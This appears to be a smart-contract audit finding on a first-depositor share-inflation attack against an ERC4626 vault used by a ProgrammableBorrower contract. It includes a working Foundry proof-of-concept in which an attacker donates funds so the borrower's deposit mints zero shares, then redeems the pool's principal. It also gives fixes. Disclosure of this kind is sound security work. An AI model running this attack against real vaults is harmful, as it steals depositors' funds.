### Title
Unvalidated ERC4626 deposits let a first depositor steal programmable-borrower principal - (`contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault with a matching asset and deposits all idle pool funds without validating the shares returned or enforcing slippage protection. [1](#0-0) [2](#0-1)  A malicious first depositor in a donation-sensitive ERC4626 vault can inflate the share price before `startEpoch`, causing the programmable borrower’s deposit to mint zero shares and then redeem the pool’s principal. [3](#0-2) [4](#0-3) 

### Finding Description
`setVault` only checks that the new vault address is nonzero and that `IERC4626(_vault).asset()` equals the pool underlying. [1](#0-0)  During `onStartEpoch`, the borrower snapshots the sum of its token balance and existing vault assets, then deposits the full token balance into the configured vault. [4](#0-3)  `_depositToVault` calls `vault.deposit` but only emits the returned share count; it does not require nonzero shares or compare the resulting claim with the deposited assets. [2](#0-1) 

For a vault that derives `totalAssets` from its raw token balance and rounds deposits down, an attacker can deposit `1`, donate enough underlying to make one share worth more than the pool deposit, and leave the programmable borrower with zero shares after `vault.deposit`. [5](#0-4)  This is analogous to the advisory’s insufficient output validation: the deposit nominally succeeds, but the returned vault position does not remain inside the intended asset boundary. [2](#0-1) 

The borrower then records the pre-deposit asset amount as `epochStartVaultAssets`, while `_currentVaultAssets()` is zero because no shares were received. [4](#0-3) [6](#0-5)  When the LP later requests withdrawal, the next stop requires that pending amount from the programmable borrower, the borrower has neither cash nor vault assets, and the CDO follows the borrower-default path. [7](#0-6) [8](#0-7) 

### Impact Explanation
The attacker can steal up to the full amount deposited into the vulnerable ERC4626 vault during `onStartEpoch`, subject to the vault’s share-price inflation ratio. [4](#0-3)  In the concrete case where the attacker donates approximately the victim deposit amount and the victim deposit mints zero shares, the attacker redeems one share for both the donation and the entire victim deposit. [2](#0-1)  The CDO’s strategy-token balance initially continues to represent the stolen principal, but later withdrawal funding fails and crystallizes the same amount as borrower default/loss. [9](#0-8) [8](#0-7) 

### Likelihood Explanation
Exploitation requires an ERC4626 vault whose deposit conversion is vulnerable to first-depositor/share-price inflation and which does not reject zero-share deposits; the borrower contract itself permits any such vault as long as its asset matches. [1](#0-0)  The attacker only needs to be an ordinary depositor in that vault and act before an honest manager calls `startEpoch`; no borrower, owner, manager, or other privileged role is required. [10](#0-9) [2](#0-1)  Vaults with virtual-share/asset offsets or balance-accounting designs that ignore donations are not susceptible to this exact transaction shape, so likelihood depends on the configured ERC4626 implementation. [11](#0-10) 

### Recommendation
Require the deposit to produce an economically meaningful share position by checking a nonzero share return and a caller-configurable or internally computed `minShares` bound before accepting the deposit. [2](#0-1)  At minimum, revert when `shares == 0` or when `vault.convertToAssets(shares)` is materially below `_assetAmount`, and prefer restricting `setVault` to audited ERC4626 implementations with donation-resistant accounting. [1](#0-0) [5](#0-4)

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ProgrammableBorrowerCreditVault.t.sol";

/// @notice Standard balance-accounted ERC4626 with no inflation offset.
/// Deployed on the mainnet fork to model a permissive vault accepted by `setVault`.
contract InflationVault is ERC4626 {
    constructor(IERC20Metadata asset_)
        ERC4626(asset_)
        ERC20("Inflation Vault Share", "ivUSDC")
    {}
}

contract ProgrammableBorrowerVaultInflationPoC is TestProgrammableBorrowerCreditVault {
    function testFirstDepositorStealsEpochDeposit() external {
        _setUpProgrammableBorrowerCreditVault(
            GAUNTLET_FORK_BLOCK,
            GAUNTLET_USDC_PRIME
        );

        InflationVault vulnerableVault =
            new InflationVault(IERC20Metadata(USDC));

        // Honest manager configures a standards-compliant but inflationable ERC4626.
        vm.prank(manager);
        programmableBorrower.setVault(address(vulnerableVault));

        uint256 victimDeposit = 10_000 * oneScale;
        address attacker = makeAddr("first-depositor");

        // Attacker creates one share and inflates its value above victimDeposit.
        deal(USDC, attacker, victimDeposit + 1);
        vm.startPrank(attacker);
        IERC20(USDC).approve(address(vulnerableVault), 1);
        vulnerableVault.deposit(1, attacker);
        IERC20(USDC).transfer(address(vulnerableVault), victimDeposit);
        vm.stopPrank();

        // Honest KYC-passing LP deposits victimDeposit into the credit vault.
        idleCDO.depositAA(victimDeposit);

        // startEpoch transfers LP principal to ProgrammableBorrower, which deposits it.
        vm.prank(manager);
        cdoEpoch.startEpoch();

        // victimDeposit / (victimDeposit + 1) rounds down to zero shares.
        assertEq(vulnerableVault.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.totalUnderlying(), 0);

        // Attacker redeems the sole share for donation + victimDeposit + 1.
        uint256 attackerBefore = IERC20(USDC).balanceOf(attacker);
        vm.prank(attacker);
        vulnerableVault.redeem(1, attacker, attacker);
        assertEq(
            IERC20(USDC).balanceOf(attacker) - attackerBefore,
            (2 * victimDeposit) + 1
        );

        // The first stop succeeds because minted-interest mode pulls no cash without pending requests.
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);
        assertFalse(cdoEpoch.defaulted());

        // The LP now requests the entire position.
        cdoEpoch.requestWithdraw(0, address(aaTranche));

        // Start the following epoch with no remaining programmable-borrower backing.
        vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
        vm.prank(manager);
        cdoEpoch.startEpoch();

        // The vault position is still empty, so funding the pending receipt defaults.
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        assertTrue(cdoEpoch.defaulted());
        assertEq(vulnerableVault.balanceOf(address(programmableBorrower)), 0);
    }
}
